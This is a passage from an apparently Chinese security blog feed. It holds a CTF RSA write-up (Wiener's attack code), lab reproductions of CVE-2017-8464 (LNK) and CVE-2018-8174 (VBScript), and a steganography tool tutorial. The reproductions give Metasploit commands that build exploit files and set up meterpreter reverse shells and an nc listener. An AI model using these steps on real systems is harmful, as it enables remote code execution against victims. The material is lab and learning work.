class="string">'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb'</span></span><br><span class="line"></span><br><span class="line">lookup = [<span class="string">'O'</span>, <span class="string">'l'</span>, <span class="string">'Z'</span>, <span class="string">'E'</span>, <span class="string">'A'</span>, <span class="string">'S'</span>, <span class="string">'b'</span>, <span class="string">'T'</span>, <span class="string">'B'</span>, <span class="string">'g'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(x)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> x:</span><br><span class="line">        ans += str(lookup.index(c))</span><br><span class="line">    <span class="keyword">return</span> int(ans)</span><br><span class="line"></span><br><span class="line">n = decode(n)</span><br><span class="line">e = decode(e)</span><br><span class="line">c = decode(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cf_expansion</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    e = []</span><br><span class="line"></span><br><span class="line">    q = n // d</span><br><span class="line">    r = n % d</span><br><span class="line">    e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">        n, d = d, r</span><br><span class="line">        q = n // d</span><br><span class="line">        r = n % d</span><br><span class="line">        e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents</span><span class="params">(e)</span>:</span></span><br><span class="line">    n = [] <span class="comment"># Nominators</span></span><br><span class="line">    d = [] <span class="comment"># Denominators</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            ni = e[i]</span><br><span class="line">            di = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            ni = e[i]*e[i<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">            di = e[i]</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># i &gt; 1</span></span><br><span class="line">            ni = e[i]*n[i<span class="number">-1</span>] + n[i<span class="number">-2</span>]</span><br><span class="line">            di = e[i]*d[i<span class="number">-1</span>] + d[i<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">        n.append(ni)</span><br><span class="line">        d.append(di)</span><br><span class="line">        <span class="keyword">yield</span> (ni, di)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(b, c)</span>:</span></span><br><span class="line">    k = b * b - <span class="number">4</span> * <span class="number">1</span> * c</span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line">    sk, complete = gmpy2.iroot(k, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> complete: <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">return</span> [int((-b + sk) // <span class="number">2</span>), int((-b - sk) // <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    kd = convergents(cf_expansion(e, n))</span><br><span class="line">    <span class="keyword">for</span> i, (k, d) <span class="keyword">in</span> enumerate(kd):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        roots = solve(phi - n - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> len(roots) == <span class="number">2</span>:</span><br><span class="line">            p, q = roots</span><br><span class="line">            <span class="keyword">if</span> p * q == n:</span><br><span class="line">                <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = wiener(e, n)</span><br><span class="line"></span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, r)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag:<code>noxCTF{RSA_1337_10rd}</code></p><p>首发于ichunqiu<br><a href="https://bbs.ichunqiu.com/thread-45809-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45809-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What is your refere
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-8464漏洞复现</title>
    <link href="https://threst.github.io/2018/09/11/CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://threst.github.io/2018/09/11/CVE-2017-8464漏洞复现/</id>
    <published>2018-09-11T07:28:14.000Z</published>
    <updated>2018-09-11T07:28:55.696Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，<br>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。<br>注释:<code>.LNK</code>是windows系统内应用程序快捷方式文件的文件类型后缀名。<br>漏洞利用条件和方式:<br>远程利用 漏洞影响范围:<br>Microsoft Windows 10 Version 1607 for 32-bit SystemsMicrosoft Windows 10 Version 1607 for x64-based SystemsMicrosoft Windows 10 for 32-bit SystemsMicrosoft Windows 10 for x64-based SystemsMicrosoft Windows 10 version 1511 for 32-bit SystemsMicrosoft Windows 10 version 1511 for x64-based SystemsMicrosoft Windows 10 version 1703 for 32-bit SystemsMicrosoft Windows 10 version 1703 for x64-based SystemsMicrosoft Windows 7 for 32-bit Systems SP1Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 8.1 for 32-bit SystemsMicrosoft Windows 8.1 for x64-based SystemsMicrosoft Windows RT 8.1</p><h2 id="win7x64本地复现"><a href="#win7x64本地复现" class="headerlink" title="win7x64本地复现"></a>win7x64本地复现</h2><p>kalix64   192.168.1.101  攻击机<br>windows7x64  192.168.1.111  目标靶机</p><h4 id="0x000下载msf脚本"><a href="#0x000下载msf脚本" class="headerlink" title="0x000下载msf脚本"></a>0x000下载msf脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</span><br></pre></td></tr></table></figure><h4 id="0x01生成监听shell"><a href="#0x01生成监听shell" class="headerlink" title="0x01生成监听shell"></a>0x01生成监听shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf  exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.101</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure><h4 id="0x02生成-LNK文件"><a href="#0x02生成-LNK文件" class="headerlink" title="0x02生成.LNK文件"></a>0x02生成.LNK文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; back</span><br><span class="line">msf &gt; use exploits/windows/fileformat/cve_2017_8464_lnk_rce</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.1.101</span><br><span class="line">LHOST =&gt; 192.168.1.101</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/11/5b976ddb0f95a.png" alt=""></p><h4 id="0x03复制到win7运行"><a href="#0x03复制到win7运行" class="headerlink" title="0x03复制到win7运行"></a>0x03复制到win7运行</h4><p><img src="https://i.loli.net/2018/09/11/5b976ddb39d97.png" alt=""></p><h4 id="0x04最后"><a href="#0x04最后" class="headerlink" title="0x04最后"></a>0x04最后</h4><p><img src="https://i.loli.net/2018/09/11/5b976ddb87cfb.png" alt=""></p><p><code>sessions -i 1</code></p><p><img src="https://i.loli.net/2018/09/11/5b976ddb52098.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/backlion/p/7243636.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/7243636.html</a><br><a href="https://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.md" target="_blank" rel="noopener">https://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.md</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在
      
    
    </summary>
    
    
      <category term="CVE-2017-8464" scheme="https://threst.github.io/tags/CVE-2017-8464/"/>
    
  </entry>
  
  <entry>
    <title>双杀0day漏洞(CVE-2018-8174)复现</title>
    <link href="https://threst.github.io/2018/09/09/%E5%8F%8C%E6%9D%800day%E6%BC%8F%E6%B4%9E(CVE-2018-8174)%E5%A4%8D%E7%8E%B0/"/>
    <id>https://threst.github.io/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/</id>
    <published>2018-09-09T14:13:14.000Z</published>
    <updated>2018-09-09T05:41:27.091Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h2><p>CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。<br>微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174<br>由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码。</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>攻击机 IP：192.168.1.101<br>靶机 IP：192.168.1.111</p><p>github:<a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2018-8174_EXP</a></p><h2 id="0x01-生成payload"><a href="#0x01-生成payload" class="headerlink" title="0x01 生成payload"></a>0x01 生成payload</h2><p><code>python CVE-2018-8174.py -u http://192.168.1.101/ -o exp.rtf -i 192.168.1.101 -p 4444</code></p><p><code>-u</code>:url地址<br><code>-o</code>: 输出文件<br><code>-i</code>：监听地址<br><code>-p</code>：监听端口</p><h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>把 explot.html 复制到 /var/www/html/，并开启 apache 服务</p><p><code>sudo cp exploit.html /var/www/html/</code></p><p>开启Apache服务<br><code>sudo service  apache2 start</code></p><p>攻击机监听端口<br><code>nc -lvvp 4444</code></p><p>靶机使用IE打开URL<br><code>http://192.168.1.101/exploit.html</code></p><p>靶机打开生成的Word文档也是一样的，可是我没测试成功</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述：&quot;&gt;&lt;a href=&quot;#漏洞描述：&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述：&quot;&gt;&lt;/a&gt;漏洞描述：&lt;/h2&gt;&lt;p&gt;CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。&lt;br&gt;微软在4月20
      
    
    </summary>
    
    
      <category term="CVE-2018-8174" scheme="https://threst.github.io/tags/CVE-2018-8174/"/>
    
  </entry>
  
  <entry>
    <title>ctf之隱寫術</title>
    <link href="https://threst.github.io/2018/08/28/CTF%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    <id>https://threst.github.io/2018/08/28/CTF之隐写术/</id>
    <published>2018-08-28T14:13:14.000Z</published>
    <updated>2018-08-28T03:32:30.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自己的良心说那次解题不是用工具去套，套中了就解开了，没套中就凉了，于是在这种大背景下，我打算写一篇关于隐写的系(xia)统(che）的文章。各位师傅看就看，别骂人。</p><h2 id="what-is-隐写？"><a href="#what-is-隐写？" class="headerlink" title="what is 隐写？"></a>what is 隐写？</h2><p>参考百度上面说就是：隐写术(Steganography)是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接收者之外的任何人知晓信息的传递事件或者信息的内容。这里提到了信息隐藏技术，粗略的说下，信息隐藏技术不仅仅只包括隐写术，还有数字水印，隐蔽信道，阀下信道，匿名通信这几种，但是我们都不需要了解，其中数字水印主要应用于产权保护，而隐写术主要应用于通信。</p><h2 id="隐写术应用场景"><a href="#隐写术应用场景" class="headerlink" title="隐写术应用场景"></a>隐写术应用场景</h2><p>要说隐写术的应用不得不提下伟大的Simmons模型，由于最近在看&lt;你好，旧时光&gt;(真心好看)，就拿林杨和余周周来打比方。<br>1.林杨和余周周分属两个教室，一个文科，一个理科。<br>2.为了将同学情谊升华需要进行通信，而通信的短信必须经过中间的潘主任的审阅。<br>3.潘主任可以阅读短信的内容，而且阅读后可以判断他们是否早恋。</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>加密短信方法不可取，因为潘主任会阅读传送的信息的内容，加密后的信息大概率会引起潘主任的怀疑，潘主任可以以此为依据对他们进行调查。因此林杨和余周周需要一种对通信过程隐藏的手段。<br>这么分析一下，可能很多同学对密码学和隐写术产生了困惑，什么时候用隐写，什么时候用密码？<br>密码学与隐写术要根据请情况的不同来选择。<br>密码学：试图通过对信息加密的方式，使信息变得无意义，继而使他人无法获得真正的信息。<br>隐写术：试图隐藏通信事件本身。<br>但他们都有相同目的都是为了针对第三方，在隐蔽性方面(总体上)隐写&gt;加密。因为加密后的文本通常为无意义文本，较易察觉(当然也存在诸如培根密码等密文为有意义文本的加密方<br>式),但在安全性上面(总体上)加密&gt;隐写,隐写方式或算法一但被识别，通常也就取得信息了，但是加密通常即使知道加密算法也无法解出明文(不考虑碰撞)。</p><p>现代数字隐写四大载体</p><ul><li>1.文本：字体、空格、标点、行间距等<br>2.图像：各类图片格式特征(png、jpg、bmp)<br>3.音频：mp3 stego、波形图、频谱图<br>4.视频：压缩视频、未压缩视频</li></ul><h3 id="关于CTF比赛"><a href="#关于CTF比赛" class="headerlink" title="关于CTF比赛"></a>关于CTF比赛</h3><p>在ctf比赛中隐写套路较为固定比赛工具较为成熟。<br>好处：通常题目难度较低，即使没有解题思路，依次尝试各个解法往往也能在没发现提示<br>的情况下找出问题所在。<br>坏处：容易形成思维定势，一旦题目考察方式不常规，往往容易无从下手，不知道从哪开<br>始去分析，失去独立发现问题和思考的能力。<br>通常作为MISC类题目的一个考察方向，(这里MISC泛指Misc &amp; Steganography &amp; forensic &amp; Crypto)，因为不作为单独分类，因此隐写术通常只是一道Misc题中的一部分，与其他考察方向<br>共同构成一道完整的Misc题。在国外CTF比赛中以计算机取证(Forensics)类的题目出现。</p><h2 id="CTF比赛中的典型隐写分析工具"><a href="#CTF比赛中的典型隐写分析工具" class="headerlink" title="CTF比赛中的典型隐写分析工具"></a>CTF比赛中的典型隐写分析工具</h2><h4 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h4><p>固件分析工具，常用作路由器逆向、后门分析，或识别二进制图像中的嵌入式文件和可<br>执行代码<br>常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令：binwalk -e firmware.bin——选项“-e&quot;和“--extract&quot;用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。</span><br><span class="line">命令：binwalk -Me firmware.bin——选项“-M&quot;和“--matryoshka&quot;用于根据magic签名扫描结果进行递归提取，仅对&quot;-e&quot;和“--dd&quot;选项有效。</span><br><span class="line">命令：binwalk -Me -d 5 firmware.bin——选项“-d&quot;和“--depth=&lt;int&gt;&quot;用于限制递归提取深度，默认深度为8，仅当“-M&quot;选项存在时有效。</span><br></pre></td></tr></table></figure></p><h4 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h4><p>图片通道查看器,常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Analyse下拉菜单：</span><br><span class="line">File Format：查看文件格式和参数信息，有时候flag会写在图片信息里</span><br><span class="line">Data Extract：数据提取，如LSB隐写等在这个选项中提取信息</span><br><span class="line">Stereogram solver：立体视图，可以左右移动控制偏移量</span><br><span class="line">Frame Broswer：逐帧浏览，如查看快速闪过的GIF图中的flag</span><br><span class="line">Image Combiner：图片结合，可以对两张图片做xor、add、sub等运算</span><br></pre></td></tr></table></figure></p><h4 id="StegDetect"><a href="#StegDetect" class="headerlink" title="StegDetect"></a>StegDetect</h4><p>数字图像隐写分析工具，主要针对JPEG,常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-q 仅显示可能包含隐藏内容的图像。</span><br><span class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-d 打印带行号的调试信息。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br></pre></td></tr></table></figure></p><h4 id="Foremost"><a href="#Foremost" class="headerlink" title="Foremost"></a>Foremost</h4><p>基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-V  - 显示版权信息并退出</span><br><span class="line">-t  - 指定文件类型.  (-t jpeg,pdf ...) </span><br><span class="line">-d  -打开间接块检测 (针对UNIX文件系统) </span><br><span class="line">-i  - 指定输入文件 (默认为标准输入) </span><br><span class="line">-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) </span><br><span class="line">-w  - 向磁盘写入审计文件，不写入任何检测到的文件</span><br><span class="line">-o  - 设置输出目录 (默认为为输出)</span><br><span class="line">-c  - 设置配置文件 (默认为 foremost.conf)</span><br><span class="line">-q  - 启用快速模式. 在512字节边界执行搜索.</span><br><span class="line">-Q  - 启用安静模式. 禁用输出消息. </span><br><span class="line">-v  - 详细模式. 向屏幕上记录所有消息。</span><br></pre></td></tr></table></figure></p><h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-t --radix=&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-e --encoding=&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, &#123;b,l&#125; = 16-bit, &#123;B,L&#125; = 32-bit</span><br></pre></td></tr></table></figure></p><h2 id="常见文件格式"><a href="#常见文件格式" class="headerlink" title="常见文件格式"></a>常见文件格式</h2><h3 id="what-is-文件格式"><a href="#what-is-文件格式" class="headerlink" title="what is 文件格式?"></a>what is 文件格式?</h3><p>文件格式（或文件类型）是指电脑为了存储信息而使用的对信息的特殊编码方式，是用于识别内部储存的资料。比如有的储存图片，有的储存程序，有的储存文字信息。每一类信息，都可以一种或多种文件格式保存在电脑存储中。每一种文件格式通常会有一种或多种扩展名可以用来识别，但也可能没有扩展名。扩展名可以帮助应用程序识别的文件格式。</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件头就是是位于文件开头的一段承担一定任务的数据。一般都在开头的部分。以jpg图片和zip压缩包文件为例。图6和图7分别是jpg图片的文件头以及jpg图片的结尾。</p><h3 id="txt格式"><a href="#txt格式" class="headerlink" title="txt格式"></a>txt格式</h3><p>txt是微软在操作系统上附带的一种文本格式，是最常见的一种文件格式 ，早在DOS时代应用就很多，主要存文本信息，即为文字信息，现在的操作系统大多使用记事本等程序保存，大多数软件可以查看，如记事本，浏览器等等。<br><img src="https://i.loli.net/2018/07/28/5b5c2ff8cadd7.jpg" alt="txt.jpg"></p><h4 id="doc-docx格式"><a href="#doc-docx格式" class="headerlink" title="doc/docx格式"></a>doc/docx格式</h4><p>doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，docx相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大。<br><img src="https://i.loli.net/2018/07/28/5b5c3256e7cdc.jpg" alt="doc和docx大小.jpg"><br>doc和docx中内容一样，docx比doc相比，体积更小。<br><img src="https://i.loli.net/2018/07/28/5b5c325808e21.jpg" alt="docx.jpg"><br>注意这里标记的pk，其实docx可以讲是一种zip文件。我们把后缀名改成zip试试。<br><img src="https://i.loli.net/2018/07/28/5b5c501148515.jpg" alt="docxzip.jpg"><br>可以看到，可以用解压软件打开。<br><img src="https://i.loli.net/2018/07/28/5b5c325811908.jpg" alt="doc.jpg"></p><h4 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h4><p>属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分。</p><p>拿张png的图片来举个例子．<br><img src="https://i.loli.net/2018/07/28/5b5c4ef373d27.png" alt="png"><br>丢到winhex中分析，对于一个PNG文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。PNG图片是有两种数据块的，一个是叫关键数据块，另一种是辅助数据块。正常的关键数据块，定义了4种标准数据块，每个PNG文件都必须包含它们。<br>一般格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件头 89 50 4E 47 0D 0A 1A 0A+数据块+数据块+数据块……</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/06/01/5b1158a6079eb.png" alt=""></p><h4 id="jpeg格式"><a href="#jpeg格式" class="headerlink" title="jpeg格式"></a>jpeg格式</h4><p>JPEG 是有损压缩格式，将像素信息用JPEG保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在0至100之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择 70 或 80 就足够了,png主要是块，而jpeg主要是以段的形式<br><img src="https://i.loli.net/2018/07/28/5b5c51e8274a8.jpg" alt="jpg"><br>一样拿张图片做栗子，注意jpg文件有些段是没有长度描述也没有内容，只有段标识和段类型。比如文件头和文件尾均属于这种段，段与段之间无论有多少 <code>FF</code>都是合法的，这些<code>FF</code>称为「填充字节」，必须被忽略掉。<br><img src="https://i.loli.net/2018/07/28/5b5c586860555.jpg" alt="文件头.jpg"><br><code>0xffd8</code>和 <code>0xffd9</code>为 JPG 文件的开始结束的标志<br><img src="https://i.loli.net/2018/07/28/5b5c5b13c92a9.jpg" alt="文件尾.jpg"></p><h4 id="bmp格式"><a href="#bmp格式" class="headerlink" title="bmp格式"></a>bmp格式</h4><p>是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成<br>文件头:前面两个字节一般42 4D，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量<br><img src="https://i.loli.net/2018/07/28/5b5c5bd8ec998.bmp" alt="1.bmp"></p><p><img src="https://i.loli.net/2018/07/28/5b5c5e8d58825.jpg" alt="bmp.jpg"><br>其中图像文件头。<code>0x4d42=’BM’</code>，表示是Windows支持的BMP格式。(注意：查ascii表B 0x42,M0x4d,bfType为两个字节，B为low字节，M为high字节所以bfType=<code>0x4D42</code>，而不是<code>0x424D</code>，请注意)<br><a href="https://baike.baidu.com/item/BMP/35116" target="_blank" rel="noopener">https://baike.baidu.com/item/BMP/35116</a></p><h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h4><p>gif就是我们经常看见的动图,比如各种表情包,从文件格式来讲它也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本.</p><p><img src="https://i.loli.net/2018/07/28/5b5c62100b597.gif" alt="gif"></p><p>我们还是用一张git图来举栗子</p><p><code>&lt;GIF数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录</code>,这个规则将<gif 